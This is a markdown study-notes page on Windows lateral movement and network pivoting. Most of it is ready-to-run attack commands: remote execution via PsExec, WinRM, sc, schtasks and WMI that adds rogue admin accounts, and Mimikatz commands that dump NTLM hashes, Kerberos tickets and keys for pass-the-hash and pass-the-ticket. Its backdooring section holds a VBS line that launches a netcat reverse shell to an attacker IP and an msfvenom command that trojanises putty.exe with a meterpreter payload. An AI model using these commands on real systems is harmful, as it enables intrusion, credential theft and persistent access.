---
title: Lateral Movement and Pivoting
layout: notes
---

# Spawning Remote Processes
## PsExec

- Port: 445 TCP
- Privilege: Administrator

<br/>`PsExec` is the go-to method to execute remote processes. `PsExec` works by:

1. Connecting to Admin$ share and uploading a service binary, PsExec uses psexesvc.exe as its name.
2. Connecting to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\Windows\psexesvc.exe.
3. Create named pipes to handle stdin/stdout/stderr.

<br/>To run PsExec:
```shell
psexec64.exe \\MACHINE_IP -u <USERNAME> -p <PASSWORD> -i cmd.exe
```

## WinRM

- Port: 5985 TCP or 5986 TCP
- Privilege: Remote Management Users

<br/>WinRM is a web-based protocol used to send PowerShell commands to remote Windows hosts. To connect from the command line:
```shell
winrs.exe -u:<USERNAME> -p <PASSWORD> -r:<TARGET> cmd
```
    
<br/>To connect with PowerShell:

```powershell
$username = 'Username';
$password = 'Password';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securepassword;
Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

## sc

- Port: 135 TCP, 445 TCP, 139 TCP, or 49152-65535 TCP (DCE/RPC)
- Privilege: Administrator

<br/>A service can be created on a remote host with `sc.exe`. `sc.exe` will try to connect to the Service Control Manager (SVCCTL) through RPC in several ways:

1. A connection attempt is made with DCE/RPC. The client connects to the Endpoint Mapper on port 135 which serves as a catalogue of available RPC endpoints and request information. The EPM responds with the IP and port to connect to SVCCTL.
2. If the latter fails, it will try to reach SVCCTL through SMB named pipes on port 445 or 139.
    
<br/>A service can be created and started with:

```shell
sc.exe \\TARGET create ServiceName binPath= "net user User Password /add" start= auto
sc.exe \\TARGET start ServiceName
```

<br/>A service can be stopped and deleted with:

```shell
sc.exe \\TARGET stop ServiceName
sc.exe \\TARGET delete ServiceName
```

## Scheduled Tasks

To remotely create a task, you can use:

```shell
schtasks /s TARGET /RU "SYSTEM" /create /tn "Task1" /tr "<COMMAND>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "Task1"
```

# Moving Laterally with WMI
## Connecting from PowerShell

To connect to WMI using PowerShell, a PSCredential object must be created.

```powershell
$username = 'Username';
$password = 'Passsword';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

<br/>Then, a WMI session can be created using either:

- DCOM: RPC over IP using 135/TCP and 49152-65535/TCP
- Wsman: WinRM using 5985/TCP or 5986/TCP

<br/>To establish a session use:

```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

## Remote Process Creation

- Ports: 135 TCP, 49152-65535 TCP (DCERPC), 5985 TCP or 5986 TCP
- Privilege: Administrator

<br/>Services can be created with WMI via PowerShell:

```powershell
Invoke-CimMethod -CimSession $session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "Service2";
DisplayName = "Service2";
PathName = "net user Admin Password /add"; # Payload
ServiceType = [byte]::Parse("16"); # Win32Own Process
StartMode = "Manual"
}
```

<br/>Now, you can get a handle on the service and start it with:

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'Service2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
```

<br/>The service can be stopped and deleted with:

```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## Scheduled Task Creation

- Port: 135 TCP, 49152-65535 (DCERPC), 5985 TCP or 5986 TCP
- Privilege: Administrator

<br/>Scheduled tasks can be created and executed with cmdlets available in default installations:

```powershell
# Split into commands and args
$Command = "cmd.exe"
$Args = "/c net user Admin Password1 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "Task2"
Start-ScheduledTask -CimSession $Session -TaskName "Task2"
```

<br/>Once used, delete with:

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "Task2"
```

## MSI Packages

- Ports: 135 TCP, 49152-65535 TCP (DCERPC), 5985 TCP or 5986 TCP
- Privilege: Administrators
    
<br/>MSI is used for installers, if an MSI package can be copied to a target system, WMI can be used to attempt an install.

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\installer.msi}"; Options = ""; AllUsers = $false}
```

<br/>WMIC can be used on legacy systems with:

```shell
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\installer.msi
```

# Use of Alternate Authentication Material
## NTLM Authentication

1. Client sends auth request to server.
2. Server generates a random number and sends it as a challenge.
3. Client combines his NTLM hash with the number to generate a response.
4. Server sends challenge and response to DC for authentication.
5. DC uses the challenge to recalculate response and compares it to initial response, if it matches, the client is authenticated.
6. Server forwards result to client.

## Pass-the-Hash

The NTLM challenge can be responded to with just a password hashes, this means we can authenticate without knowing the password. If a domain is configured for NTLM authentication, a PtH attack can be used. Hashes can be extracted using a tool like Mimikatz.

```shell
privilege::debug
token::elevate
lsadump::sam
```

<br/>Hashes can also be extracted for local or domain users who have recently logged on:

```shell
privilege::debug
token::elevate
sekurlsa::msv
```

<br/>These extracted hashes can then be used to perform pass-the-hash attacks:

```shell
token::revert
sekurlsa:pth /user:user.name /domain:domain /ntlm:hash /run:"<command>"
```

<br/>On Linux you can use:

- RDP: `xfreerdp /v:TARGET /u:DOMAIN\\User /pth:NTLM_HASH`
- PsExec: `psexec.py -hashes NTLM_HASH DOMAIN/UserName@TARGET`
- WinRM: `evil-winrm -i TARGET -u UserName -H NTLM_HASH`

## Kerberos Authentication

1. User sends username and timestamp encrypted with a key derived from his password to the Key Distribution Center (KDC). The KDC sends back a Ticket Granting Ticket (TGT), which allows the user to request access to services without entering credentials. A session key is also given to the user.
2. Users use their TGT to ask the KDC for a Ticket Granting Service (TGS). TGS are tickets that allow connections to a specific service for which they were created. To request a TGS, the user sends their username and timestamp encrypted with the Session Key, TGT and Service Principle Name (SPN) which indicates the service and server name to access. The KDC will then send a TGS and Service Session Key. The TGS is encrypted using the Service Owner Hash. The Service Owner is the machine or user account which the service runs as, the TGS contains a copy of the Service Session Key so that the Service Owner can access it by decrypting the TGS.
3. The TGS can then be used to authenticate and establish a connection.

## Pass-the-Ticket

It may be possible to extract tickets and session keys from LSASS using mimikatz, this normally requires `SYSTEM` privileges.

```shell
privilege::debug
sekursla::tickets /export
```

<br/>Both the ticket and corresponding session key are required. TGTs are of interest because they can request access to any services the user is allowed to access, whilst TGS are only good for certain services. TGTs require admin rights, TGS can be done with a low-level account. An acquired ticket can be injected into the current session with:

```shell
kerberos::ptt <TICKET>
```

## Overpass-the-Hash/Pass-the-Key

Kerberos encryption keys can be extracted with:

```shell
privilege::debug
sekurlsa::ekeys
```

<br/>If you get the RC4 hash:

```shell
sekurlsa::pth /user:User /domain:Domain /rc4:RC4_Hash /run:"<command>"
```

<br/>If you get the AES128 hash:

```shell
sekurlsa::pth /user:User /domain:Domain /aes128:AES128_Hash /run:"<command>"
```

<br/>If you get the AES256 hash:

```shell
sekurlsa::pth /user:User /domain:Domain /aes256:AES256_Hash /run:"<command>"
```

# Abusing User Behaviour
## Abusing Writeable Shares

Network shares used by legit users for day-to-day tasks can be used by attackers to plant malicious files to force users into executing arbitrary payloads.

## Backdooring .vbs Scripts

If a shared resource is a `.vbs` script, a copy of `nc64.exe` could be planted on the same share, and the following injected into the script:

```
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\TARGET\TARGETSHARE\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

## Backdooring .exe Files

If a shared file is a Windows binary, it could be downloaded and injected with a backdoor using msfvenom.

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

## RDP Hijack

If an admin closes an RDP client instead of logging off, their session will remain open indefinitely. With `SYSTEM` privileges on Windows 2016 and earlier, any RDP session can be taken over without a password. To connect and takeover a session, list sessions with `query user` and then use: `tscon 3 /dest:<session>` to take over.

# Port Forwarding
## SSH Tunnelling

SSH tunnelling can be used to forward ports through an SSH connection. When making a connection back to your own machine, a user should be created without any console access to use for creating the tunnels:

```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunnelluser
```

## SSH Remote Port Forwarding

If firewall policies block the attacking machine from accessing port 3389 on the server, the attacker can use a compromised machine which can access port 3389 to pivot with remote port forwarding. This allows you to take a reachable port from the SSH client on a machine, and project it onto a remote SSH server you control. The result is that the attacker will be able to connect back to port 3389, and the target machine will proxy the connection. To forward port 3389 on a server with IP address 3.3.3.3:

```bash
ssh tunnelusr@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

<br/>Note that the port opened and the port forwarded don't need to match.

## SSH Local Port Forwarding

Local port forwarding allows a port to be pulled from the server to the client. This could make any service available on the attacking machine available via a port on the target machine. This allows reverse shells to be run on hosts which normally can't run them. To forward port 80 from an attacking machine:

```bash
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

## Port Forwarding with Socat

Where SSH is not available, socat can be used. The main disadvantage of this is that socat will need to be transferred to the pivot machine. To perform port forwarding with socat:

```bash
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
```

<br/>The fork option lets socat handle multiple connections without closing. Firewall rules may need created on the target to allow connections (this requires admin):

```shell
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

## Dynamic Port Forwarding and SOCKS

Dynamic port forwarding allows pivoting through a host and establishing several connections with a SOCKS proxy. The SSH client can be configured to establish a reverse dynamic port forward:

```bash
ssh tunnelluser@1.1.1.1 -R 9050 -N
```

<br/>The SSH server here will start a SOCKS proxy on port 9050. Proxychains can then be used to point any connection to the same port used by SSH for the proxy server. The config can be found at `/etc/proxychains.conf`. To execute a command via the proxy, like `curl`, you can use:

```bash
proxychains curl <url>
```